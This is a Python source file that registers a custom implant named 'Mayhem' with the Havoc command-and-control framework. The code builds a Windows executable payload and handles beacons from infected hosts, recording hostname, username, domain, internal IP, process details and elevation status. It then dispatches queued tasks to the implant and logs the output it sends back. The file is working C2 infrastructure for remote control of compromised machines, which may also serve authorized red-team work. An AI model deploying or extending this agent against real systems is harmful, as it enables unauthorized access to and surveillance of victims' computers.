import os

from dotenv import load_dotenv

from havoc.agent import *
from havoc.service import HavocService

load_dotenv()

REGISTER_AGENT         = 0x187
GET_JOB                = 0x143
NO_JOB                 = 0x144
OUTPUT_AGENT           = 0x188
class Mayhem(AgentType):
    Name = "Mayhem"
    Author = "me1n + Hera + Cushz"
    Version = "0.1"
    Description = "3rd party agent created for Talon"
    MagicValue = 0x6D61796F   # 'mayo'
    Arch = ["x64"]
    Formats = [{"Name": "Windows Executable", "Extension": "exe"}]
    BuildingConfig = {"Sleep": "10"}
    Commands = []

    #builds the payload that the client requests. For example, if you select exe paylaod from ui, this builds the exe for you.
    def generate (self, config: dict) -> None:
        print( f"config: {config}" )

        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        os.system("cmake . && make")

        data = open("./Bin/mayo.exe", "rb").read()

        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data)

    def response (self, response: dict) -> bytes:
        agent_header = response["AgentHeader"]
        agent_response = b64decode( response["Response"] )
        response_parser = Parser (agent_response, len(agent_response))
        Command = response_parser.parse_int()

        #Registering Agent if it is the first time
        if response["Agent"] == None:

            if Command == REGISTER_AGENT:
                print("Agent requesting to register")

                RegisterInfo = {
                    "AgentID"           : response_parser.parse_int(),#4 bytes
                    "Hostname"          : response_parser.parse_str(),#length prefix + chars
                    "Username"          : response_parser.parse_str(),
                    "Domain"            : response_parser.parse_str(),
                    "InternalIP"        : response_parser.parse_str(),
                    "Process Path"      : response_parser.parse_str(),
                    "Process ID"        : str(response_parser.parse_int()),
                    "Process Parent ID" : str(response_parser.parse_int()),
                    "Process Arch"      : response_parser.parse_int(),
                    "Process Elevated"  : response_parser.parse_int(),
                    "OS Build"          : str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()), # (MajorVersion).(MinorVersion).(ProductType).(ServicePackMajor).(BuildNumber)
                    "OS Arch"           : response_parser.parse_int(),
                    "SleepDelay"             : response_parser.parse_int(),
                }

                RegisterInfo["Process Name"] = RegisterInfo["Process Path"].split("\\")[-1]
                RegisterInfo["OS Version"] = RegisterInfo["OS Build"]

                #These numbers are from SYSTEM_INFO struct in winnt.h
                if RegisterInfo[ "OS Arch" ] == 0:
                    RegisterInfo[ "OS Arch" ] = "x86"
                elif RegisterInfo[ "OS Arch" ] == 9:
                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
                elif RegisterInfo[ "OS Arch" ] == 5:
                    RegisterInfo[ "OS Arch" ] = "ARM"
                elif RegisterInfo[ "OS Arch" ] == 12:
                    RegisterInfo[ "OS Arch" ] = "ARM64"
                elif RegisterInfo[ "OS Arch" ] == 6:
                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
                else:
                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"

            # Process Arch
                if RegisterInfo[ "Process Arch" ] == 5:
                    RegisterInfo[ "Process Arch" ] = "Unknown"

                elif RegisterInfo[ "Process Arch" ] == 10:
                    RegisterInfo[ "Process Arch" ] = "x86"

                elif RegisterInfo[ "Process Arch" ] == 15:
                    RegisterInfo[ "Process Arch" ] = "x64"

                elif RegisterInfo[ "Process Arch" ] == 20:
                    RegisterInfo[ "Process Arch" ] = "IA64"

                self.register( agent_header, RegisterInfo )

                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # This is the agent ID that is generated for further use
            else:
                print( "This is not agent register request" )
        else:
            print(f"Something else: {Command}")

            AgentID = response["Agent"]["NameID"] # This is the str version of the existing agent ID but it comes under the name of NameID

            if Command == GET_JOB:
                print("Get the list of jobs assigned to this agent.")

                Tasks = self.get_task_queue( response["Agent"])

                if len(Tasks) == 0:
                    Tasks = NO_JOB.to_bytes(4, 'little')

                print(f"Tasks: {Tasks.hex()}")
                return Tasks
            elif Command == OUTPUT_AGENT:

                Output = response_parser.parse_str()
                print("Output: \n" + Output)

                self.console_message(AgentID, "Done", "Recieved Output:",Output)
            else:
                self.console_message(AgentID, "Error", "Command not found: %4x" % Command, "")
        return b''

def main():
    endpoint = os.environ.get("service_endpoint")
    password = os.environ.get("service_password")

    if not endpoint or not password:
        raise SystemExit(
            "[!] service_endpoint and service_password must be set.\n"
            "    Copy .env.example to .env and fill it in."
        )

    service = HavocService(endpoint=endpoint, password=password)
    service.register_agent(Mayhem())


if __name__ == '__main__':
    main()
